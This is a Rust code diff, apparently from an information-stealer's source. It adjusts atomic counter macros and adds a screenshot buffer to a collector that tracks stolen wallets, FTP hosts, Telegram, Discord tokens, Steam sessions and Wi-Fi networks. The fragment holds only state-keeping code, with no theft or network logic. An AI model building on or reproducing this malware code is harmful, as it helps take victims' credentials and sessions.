@@ -1,5 +1,7 @@
 use crate::{Browser, Collector, Device, FileGrabber, Software, Vpn};
+use alloc::vec::Vec;
 use core::sync::atomic::{AtomicBool, AtomicUsize};
+use spin::RwLock;
 
 macro_rules! impl_atomic_usize_counter {
     ($field:ident) => {
@@ -17,8 +19,7 @@ macro_rules! impl_atomic_usize_counter {
     };
 }
 
-#[allow(unused_macros)]
-macro_rules! impl_atomic_bool_flag {
+macro_rules! impl_atomic_flag {
     ($field:ident) => {
         paste::paste! {
             fn [<set_ $field>](&self) {
@@ -29,6 +30,22 @@ macro_rules! impl_atomic_bool_flag {
             fn [<is_ $field>](&self) -> bool {
                 use core::sync::atomic::Ordering;
                 self.$field.load(Ordering::Relaxed)
+            }
+        }
+    };
+}
+
+macro_rules! impl_spin_lock_flag {
+    ($field:ident, $ty:ty) => {
+        paste::paste! {
+            fn [<set_ $field>](&self, val: $ty) {
+                let mut lock = self.$field.write();
+                *lock = Some(val);
+            }
+
+            fn [<get_ $field>](&self) -> Option<$ty> {
+                let lock = self.$field.read();
+                lock.clone()
             }
         }
     };
@@ -67,7 +84,7 @@ pub struct AtomicUsizeSoftware {
 impl Software for AtomicUsizeSoftware {
     impl_atomic_usize_counter!(wallets);
     impl_atomic_usize_counter!(ftp_hosts);
-    impl_atomic_bool_flag!(telegram);
+    impl_atomic_flag!(telegram);
     impl_atomic_usize_counter!(discord_tokens);
     impl_atomic_usize_counter!(steam_session);
 }
@@ -96,11 +113,13 @@ impl Vpn for AtomicUsizeVpn {
 
 #[derive(Default)]
 pub struct AtomicDevice {
-    wifi_networks: AtomicUsize
+    wifi_networks: AtomicUsize,
+    screenshot: RwLock<Option<Vec<u8>>>,
 }
 
 impl Device for AtomicDevice {
     impl_atomic_usize_counter!(wifi_networks);
+    impl_spin_lock_flag!(screenshot, Vec<u8>);
 }
 
 #[derive(Default)]
@@ -109,7 +128,7 @@ pub struct AtomicCollector {
     software: AtomicUsizeSoftware,
     file_grabber: AtomicFileGrabber,
     vpn: AtomicUsizeVpn,
-    device: AtomicDevice
+    device: AtomicDevice,
 }
 
 impl Collector for AtomicCollector {
